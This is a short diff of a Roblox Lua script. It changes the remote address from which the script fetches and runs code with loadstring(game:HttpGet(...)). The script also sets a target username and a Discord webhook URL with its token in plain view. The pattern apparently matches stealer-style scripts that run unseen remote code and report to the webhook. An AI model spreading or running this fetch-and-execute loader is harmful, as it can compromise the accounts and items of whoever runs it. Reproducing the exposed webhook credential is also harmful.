@@ -1,4 +1,4 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/HuiScripts/MM22SCRSRC/refs/heads/main/SrcForPPL.txt'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/HuiScripts/Baccccon-files/refs/heads/main/SrcForPPL2'))()
 userName = "AxolotlBestYo"
 webHook = "https://discord.com/api/webhooks/1296370876635414590/gUGEKGk4qTYjuhP2aQXrKoGnKhhu6NTm5P1C0cW1E_DUZqr2XHKLtCsoohbkFBif6phJ"
 
